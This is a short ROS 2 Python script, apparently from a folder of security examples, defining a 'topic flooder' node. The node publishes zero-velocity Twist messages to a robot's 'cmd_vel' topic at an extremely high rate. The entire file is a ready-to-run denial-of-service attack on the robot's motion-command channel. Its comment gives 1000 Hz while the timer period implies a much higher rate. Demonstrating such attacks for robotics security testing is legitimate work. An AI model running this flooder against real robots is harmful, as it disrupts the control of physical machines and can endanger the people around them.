# security_examples/topic_flooder.py
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist

class TopicFlooderNode(Node):
    def __init__(self):
        super().__init__('topic_flooder')
        self.publisher_ = self.create_publisher(Twist, 'cmd_vel', 10)
        # Attempt to publish at a very high rate (e.g., 1000 Hz)
        # Note: Python performance may limit the actual rate
        timer_period = 0.00001 
        self.timer = self.create_timer(timer_period, self.timer_callback)
        self.get_logger().warn('!!! Topic Flooder Node ACTIVE!!!')

    def timer_callback(self):
        msg = Twist()
        # The content doesn't matter as much as the frequency
        msg.linear.x = 0.0
        msg.angular.z = 0.0
        self.publisher_.publish(msg)

def main(args=None):
    rclpy.init(args=args)
    topic_flooder = TopicFlooderNode()
    rclpy.spin(topic_flooder)
    topic_flooder.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()